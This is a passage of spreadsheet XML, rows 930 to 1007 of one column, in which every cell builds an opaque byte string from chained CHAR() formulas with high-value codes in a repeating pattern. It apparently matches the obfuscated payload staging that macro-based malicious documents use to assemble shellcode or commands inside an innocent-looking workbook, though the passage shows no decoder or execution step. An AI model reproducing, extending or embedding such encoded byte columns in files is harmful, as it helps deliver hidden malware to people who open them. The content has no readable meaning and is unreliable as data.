        <f>CHAR(187)&amp;CHAR(191)&amp;CHAR(247)&amp;CHAR(143)&amp;CHAR(244)&amp;CHAR(87)&amp;CHAR(205)&amp;CHAR(143)&amp;CHAR(187)&amp;CHAR(142)</f>
        <v>»¿÷ôWÍ»Ž</v>
      </c>
    </row>
    <row r="930" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C930" t="str">
        <f>CHAR(247)&amp;CHAR(144)&amp;CHAR(244)&amp;CHAR(87)&amp;CHAR(205)&amp;CHAR(153)&amp;CHAR(187)&amp;CHAR(128)&amp;CHAR(247)&amp;CHAR(142)</f>
        <v>÷ôWÍ™»€÷Ž</v>
      </c>
    </row>
    <row r="931" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C931" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(203)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(106)</f>
        <v>ô6Íë»Ë÷ýôj</v>
      </c>
    </row>
    <row r="932" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C932" t="str">
        <f>CHAR(205)&amp;CHAR(242)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(178)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(205)&amp;CHAR(130)</f>
        <v>Íò»ê÷²ôDÍ‚</v>
      </c>
    </row>
    <row r="933" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C933" t="str">
        <f>CHAR(187)&amp;CHAR(140)&amp;CHAR(247)&amp;CHAR(148)&amp;CHAR(244)&amp;CHAR(88)&amp;CHAR(205)&amp;CHAR(138)&amp;CHAR(187)&amp;CHAR(135)</f>
        <v>»Œ÷”ôXÍŠ»‡</v>
      </c>
    </row>
    <row r="934" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C934" t="str">
        <f>CHAR(247)&amp;CHAR(187)&amp;CHAR(244)&amp;CHAR(95)&amp;CHAR(205)&amp;CHAR(135)&amp;CHAR(187)&amp;CHAR(142)&amp;CHAR(247)&amp;CHAR(147)</f>
        <v>÷»ô_Í‡»Ž÷“</v>
      </c>
    </row>
    <row r="935" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C935" t="str">
        <f>CHAR(244)&amp;CHAR(87)&amp;CHAR(205)&amp;CHAR(134)&amp;CHAR(187)&amp;CHAR(142)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(105)</f>
        <v>ôWÍ†»Ž÷ýôi</v>
      </c>
    </row>
    <row r="936" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C936" t="str">
        <f>CHAR(205)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(147)&amp;CHAR(247)&amp;CHAR(158)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(205)&amp;CHAR(135)</f>
        <v>ÍŽ»“÷žôSÍ‡</v>
      </c>
    </row>
    <row r="937" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C937" t="str">
        <f>CHAR(187)&amp;CHAR(133)&amp;CHAR(247)&amp;CHAR(137)&amp;CHAR(244)&amp;CHAR(82)&amp;CHAR(205)&amp;CHAR(132)&amp;CHAR(187)&amp;CHAR(133)</f>
        <v>»…÷‰ôRÍ„»…</v>
      </c>
    </row>
    <row r="938" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C938" t="str">
        <f>CHAR(247)&amp;CHAR(136)&amp;CHAR(244)&amp;CHAR(66)&amp;CHAR(205)&amp;CHAR(180)&amp;CHAR(187)&amp;CHAR(170)&amp;CHAR(247)&amp;CHAR(143)</f>
        <v>÷ˆôBÍ´»ª÷</v>
      </c>
    </row>
    <row r="939" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C939" t="str">
        <f>CHAR(244)&amp;CHAR(93)&amp;CHAR(205)&amp;CHAR(161)&amp;CHAR(187)&amp;CHAR(179)&amp;CHAR(247)&amp;CHAR(142)&amp;CHAR(244)&amp;CHAR(24)</f>
        <v>ô]Í¡»³÷Žô_x0018_</v>
      </c>
    </row>
    <row r="940" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C940" t="str">
        <f>CHAR(205)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(147)&amp;CHAR(247)&amp;CHAR(152)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>ÍŽ»“÷˜ô6Íë</v>
      </c>
    </row>
    <row r="941" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C941" t="str">
        <f>CHAR(187)&amp;CHAR(207)&amp;CHAR(247)&amp;CHAR(255)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(187)&amp;CHAR(187)&amp;CHAR(153)</f>
        <v>»Ï÷ÿô7Í»»™</v>
      </c>
    </row>
    <row r="942" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C942" t="str">
        <f>CHAR(247)&amp;CHAR(146)&amp;CHAR(244)&amp;CHAR(82)&amp;CHAR(205)&amp;CHAR(158)&amp;CHAR(187)&amp;CHAR(136)&amp;CHAR(247)&amp;CHAR(137)</f>
        <v>÷’ôRÍž»ˆ÷‰</v>
      </c>
    </row>
    <row r="943" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C943" t="str">
        <f>CHAR(244)&amp;CHAR(120)&amp;CHAR(205)&amp;CHAR(138)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(247)&amp;CHAR(152)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ôxÍŠ»†÷˜ô6</v>
      </c>
    </row>
    <row r="944" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C944" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(203)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(30)&amp;CHAR(205)&amp;CHAR(233)</f>
        <v>Íë»Ë÷ýô_x001E_Íé</v>
      </c>
    </row>
    <row r="945" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C945" t="str">
        <f>CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(173)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(205)&amp;CHAR(132)&amp;CHAR(187)&amp;CHAR(143)</f>
        <v>»ê÷­ôDÍ„»</v>
      </c>
    </row>
    <row r="946" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C946" t="str">
        <f>CHAR(247)&amp;CHAR(136)&amp;CHAR(244)&amp;CHAR(85)&amp;CHAR(205)&amp;CHAR(159)&amp;CHAR(187)&amp;CHAR(189)&amp;CHAR(247)&amp;CHAR(152)</f>
        <v>÷ˆôUÍŸ»½÷˜</v>
      </c>
    </row>
    <row r="947" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C947" t="str">
        <f>CHAR(244)&amp;CHAR(68)&amp;CHAR(205)&amp;CHAR(152)&amp;CHAR(187)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(146)&amp;CHAR(244)&amp;CHAR(88)</f>
        <v>ôDÍ˜»‚÷’ôX</v>
      </c>
    </row>
    <row r="948" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C948" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(203)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»Ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="949" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C949" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="950" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C950" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="951" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C951" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="952" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C952" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="953" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C953" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="954" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C954" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="955" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C955" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="956" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C956" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="957" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C957" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="958" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C958" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="959" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C959" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="960" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C960" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="961" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C961" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="962" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C962" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="963" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C963" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="964" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C964" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="965" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C965" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="966" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C966" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="967" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C967" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="968" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C968" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="969" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C969" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="970" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C970" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="971" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C971" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="972" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C972" t="str">
        <f>CHAR(253)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(231)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(230)&amp;CHAR(111)&amp;CHAR(235)</f>
        <v>ýë»ç÷ýôæoë</v>
      </c>
    </row>
    <row r="973" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C973" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="974" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C974" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="975" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C975" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="976" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C976" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="977" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C977" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="978" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C978" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="979" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C979" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="980" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C980" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="981" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C981" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="982" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C982" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="983" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C983" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="984" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C984" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="985" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C985" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="986" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C986" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="987" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C987" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="988" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C988" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="989" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C989" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="990" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C990" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="991" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C991" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="992" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C992" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="993" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C993" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="994" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C994" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="995" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C995" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="996" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C996" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="997" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C997" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="998" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C998" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="999" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C999" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="1000" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1000" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="1001" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1001" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="1002" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1002" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="1003" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1003" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="1004" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1004" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="1005" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1005" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="1006" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1006" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="1007" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1007" t="str">
